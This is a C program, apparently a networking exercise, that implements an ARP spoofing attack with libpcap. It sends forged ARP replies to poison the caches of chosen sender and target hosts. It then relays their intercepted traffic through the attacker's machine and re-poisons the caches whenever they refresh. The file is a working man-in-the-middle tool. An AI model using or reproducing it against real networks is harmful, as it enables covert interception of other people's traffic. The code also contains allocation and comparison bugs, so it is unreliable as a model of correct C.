#include<stdio.h>
#include<stdlib.h>
#include<pcap.h>
#include<arpa/inet.h>
#include<string.h>
#include<net/if.h>
#include<sys/ioctl.h>
#include<stdint.h>

void usage() {
	printf("syntax: arp_spoof <interface> <sender_ip> <target_ip> [<sender_ip>] [<target_ip] ... \n");
	printf("sample: arp_spoof eth0 192.168.10.101 192.168.10.1 192.168.10.1 192.168.10.101 ...\n");
}

unsigned char MACbroadcast[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
unsigned char MACno[6] = {0, };
unsigned char ETHERTYPE[] = {0x08, 0x06};
unsigned char ETHERNET[] = {0x00, 0x01};
unsigned char IPv4[] = {0x08, 0x00};
unsigned char HWSIZE = 0x06;
unsigned char PROTOSIZE = 0x04;
unsigned char REQUEST[] = {0x00, 0x01};
unsigned char REPLY[] = {0x00, 0x02};


struct ETHERHeader {
	unsigned char dst_MAC[6];
	unsigned char src_MAC[6];
	unsigned char ETHERTYPE[2];
};

struct ARP {
	unsigned char hw_type[2];
	unsigned char proto_type[2];
	unsigned char hw_len;
	unsigned char proto_len;
	unsigned char opcode[2];
	unsigned char sender_hw_addr[6];
	unsigned char sender_ip_addr[4];
	unsigned char recver_hw_addr[6];
        unsigned char recver_ip_addr[4];
};	

struct ARPFrame {
	struct ETHERHeader ether_header;
	struct ARP arp;
};


void getMyMAC(char* dev, unsigned char* myMAC);
unsigned char* IPstr2char(char* IPstr);
struct ARPFrame* SetARPPacket(struct ARPFrame* arp_frame, unsigned char* dst_mac, unsigned char* src_mac, unsigned char* opcode, unsigned char* sendMAC, unsigned char* sendip, unsigned char* recvMAC, unsigned char* recvip);
unsigned char* getMyIP(char* dev, unsigned char* myIP); 
unsigned char* getSenderMAC(struct ARPFrame* recv_arp_frame, pcap_t *p, unsigned char* myMAC, unsigned char* myIP);
void relay(pcap_t* p, unsigned char* senderMAC, unsigned char* targetMAC, unsigned char* myMAC, struct ARPFrame** infection_arp, int sessions);
void sendInfectionARP(pcap_t* p, struct ARPFrame** infection_arp, int sessions);

int main(int argc, char* argv[]) {
	if(argc < 4){
		usage();
		return -1;
	}

	if(argc%2 == 1) {
		printf("wrong use\n");
		return -1;
	}

	char* dev = argv[1];
	int sessions = (argc-2)/2;
	unsigned char** sendips = (unsigned char**)malloc(sessions);
	unsigned char** sendmacs = (unsigned char**)malloc(sessions);
	for(int i=0; i<sessions; i++) {
		sendmacs[i] = (unsigned char*)malloc(6);
	}
	unsigned char** recvips = (unsigned char**)malloc(sessions);
	unsigned char** recvmacs = (unsigned char**)malloc(sessions);
	for(int i=0; i<sessions; i++) {
		recvmacs[i] = (unsigned char*)malloc(6);
	}

	unsigned char* myMAC = (unsigned char*)malloc(6);
	unsigned char* myIP = (unsigned char*)malloc(4);
	pcap_t *p;
	char errbuf[PCAP_ERRBUF_SIZE];

	for(int i=0; i<sessions; i++) {
		sendips[i] = IPstr2char(argv[i*2+2]);
		recvips[i] = IPstr2char(argv[i*2+3]);
	}

	getMyMAC(dev, myMAC);
	myIP = getMyIP(dev, myIP);
	
	struct ARPFrame arp_frame;
	struct ARPFrame* parp_frame = (struct ARPFrame*)malloc(sizeof(struct ARPFrame));//= &arp_frame;
	struct ARPFrame* precv_arp_frame;

	struct ARPFrame arp_frame2;
	struct ARPFrame* parp_frame2 = (struct ARPFrame*)malloc(sizeof(struct ARPFrame));

	struct ARPFrame** infection_arp = (struct ARPFrame**)malloc(sessions);
	for(int i=0; i<sessions; i++) {
		infection_arp[i] = (struct ARPFrame*)malloc(sizeof(struct ARPFrame));
	}


	p = pcap_open_live(dev, 65535, 0, 1000, errbuf);

	//get sender macs
	for(int i=0; i<sessions; i++) {
		parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, sendips[i]);
		pcap_sendpacket(p, (const u_char *)parp_frame, 42);
		memcpy(sendmacs[i], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);
	}
	//get target masc
	for(int i=0; i<sessions; i++) {
		parp_frame = SetARPPacket(parp_frame, MACbroadcast, myMAC, REQUEST, myMAC, myIP, MACno, recvips[i]);
		pcap_sendpacket(p, (const u_char *)parp_frame, 42);
		memcpy(recvmacs[i], getSenderMAC(precv_arp_frame, p, myMAC, myIP), 6);
	}


	//send defect arps
	for(int i=0; i<sessions; i++) {
		infection_arp[i] = SetARPPacket(infection_arp[i], sendmacs[i], myMAC, REPLY, myMAC, recvips[i], sendmacs[i], sendips[i]);
	}
	sendInfectionARP(p, infection_arp, sessions);

	//relay
	relay(p, sendmacs[0], recvmacs[0], myMAC, infection_arp, sessions);

	return 0;

}

unsigned char* getMyIP(char* dev, unsigned char* myIP) {
	struct ifreq ifr;
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	strcpy(ifr.ifr_name, dev);
	ioctl(sock, SIOCGIFADDR, &ifr);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, (char*)myIP, sizeof(struct sockaddr));
	myIP = IPstr2char((char*)myIP);
	return myIP;
}

void getMyMAC(char* dev, unsigned char* myMAC) {
	struct ifreq ifr;
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	strcpy(ifr.ifr_name, dev);
	ioctl(sock, SIOCGIFHWADDR, &ifr);

	memcpy(myMAC, (unsigned char*)ifr.ifr_hwaddr.sa_data, 6);
}

unsigned char* getSenderMAC(struct ARPFrame* recv_arp_frame, pcap_t* p, unsigned char* myMAC, unsigned char* myIP) {
	unsigned char* sendermac;
	while(true){
		const u_char* packet;
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(p, &header, &packet);
		recv_arp_frame = (struct ARPFrame*)packet;
		if(memcmp(recv_arp_frame->ether_header.ETHERTYPE, ETHERTYPE, 2)==0 && memcmp(recv_arp_frame->arp.opcode, REPLY, 2)==0 && memcmp(recv_arp_frame->arp.recver_hw_addr, myMAC, 6)==0 && memcmp(recv_arp_frame->arp.recver_ip_addr, myIP, 6)==0){
			sendermac = (unsigned char*)recv_arp_frame->ether_header.src_MAC;
			break;
		}
	}

	return sendermac;
}

unsigned char* IPstr2char(char* IPstr) {
	unsigned char* IPchar = (unsigned char*)malloc(4);
	char* token;
	int i=0;
	token = strtok(IPstr, ".");

	while(token != NULL) {
		IPchar[i] = atoi(token);
		token = strtok(NULL, ".");
		i++;
	}

	return IPchar;
}

struct ARPFrame* SetARPPacket(struct ARPFrame* arp_frame, unsigned char* dst_mac, unsigned char* src_mac, unsigned char* opcode, unsigned char* sendMAC, unsigned char* sendip, unsigned char* recvMAC, unsigned char* recvip) {
	
	memcpy(arp_frame->ether_header.dst_MAC, dst_mac, 6);
	memcpy(arp_frame->ether_header.src_MAC, src_mac, 6);
	memcpy(arp_frame->ether_header.ETHERTYPE, ETHERTYPE, 2);

	memcpy(arp_frame->arp.hw_type, ETHERNET, 2);
	memcpy(arp_frame->arp.proto_type, IPv4, 2);
	arp_frame->arp.hw_len = HWSIZE;
	arp_frame->arp.proto_len = PROTOSIZE;
	memcpy(arp_frame->arp.opcode, opcode, 2);
	memcpy(arp_frame->arp.sender_hw_addr, sendMAC, 6);
	memcpy(arp_frame->arp.sender_ip_addr, sendip, 4);
	memcpy(arp_frame->arp.recver_hw_addr, recvMAC, 6);
	memcpy(arp_frame->arp.recver_ip_addr, recvip, 4);

	return arp_frame;
}

void relay(pcap_t* p, unsigned char* senderMAC, unsigned char* targetMAC, unsigned char* myMAC, struct ARPFrame** infection_arp, int sessions) {
	const u_char* packet;
	unsigned char* rel_packet;
	struct pcap_pkthdr* header;
	while(true){
	int res = pcap_next_ex(p, &header, &packet);
		rel_packet = (unsigned char*)malloc(header->caplen);
		memcpy(rel_packet, packet, header->caplen);
		if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), senderMAC, 6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)!=0){
			memcpy(rel_packet, targetMAC, 6);		
			memcpy(rel_packet+6, myMAC, 6);	
/*		printf("REQ\n");
		printf("packet:");
		for(int i=0; i<0x0f; i++)
		printf("%02x ", packet[i]);	
		printf("\n");
		printf("rel_pk:");
		for(int i=0; i<0x0f; i++)
		printf("%02x ", rel_packet[i]);	
		printf("\n");
*/
			pcap_sendpacket(p, (const u_char*)rel_packet, header->caplen);
		}
		else if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), targetMAC, 6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)!=0) {
			memcpy(rel_packet, senderMAC, 6);
			memcpy(rel_packet+6, myMAC, 6);
/*		printf("APY\n");
		printf("packet:");
		for(int i=0; i<0x0f; i++)
		printf("%02x ", packet[i]);	
		printf("\n");
		printf("rel_pk:");
		for(int i=0; i<0x0f; i++)
		printf("%02x ", rel_packet[i]);	
		printf("\n");
*/

			pcap_sendpacket(p, (const u_char*)rel_packet, header->caplen);
		}
		//reinfection
		//target's unicast
		else if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), targetMAC, 6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
			sendInfectionARP(p, infection_arp, sessions);
		}
		//sender's unicast
		else if(memcmp(&(rel_packet[0]), myMAC, 6)==0 && memcmp(&(rel_packet[6]), senderMAC,6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
			sendInfectionARP(p, infection_arp, sessions);
		}
		//target's broadcast
		else if(memcmp(&(rel_packet[0]), MACbroadcast, 6)==0 && memcmp(&(rel_packet[6]), targetMAC,6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
			sendInfectionARP(p, infection_arp, sessions);
		}
		//sender's broadcast
		else if(memcmp(&(rel_packet[0]), MACbroadcast, 6)==0 && memcmp(&(rel_packet[6]), senderMAC,6)==0 && memcmp(&(rel_packet[0x0c]), ETHERTYPE, 2)==0) {
			sendInfectionARP(p, infection_arp, sessions);
		}
	}
}
void sendInfectionARP(pcap_t* p, struct ARPFrame** infection_arp, int sessions) {
	for(int i=0; i<sessions; i++) {
		pcap_sendpacket(p, (const u_char *)infection_arp[i], 42);
	}
}


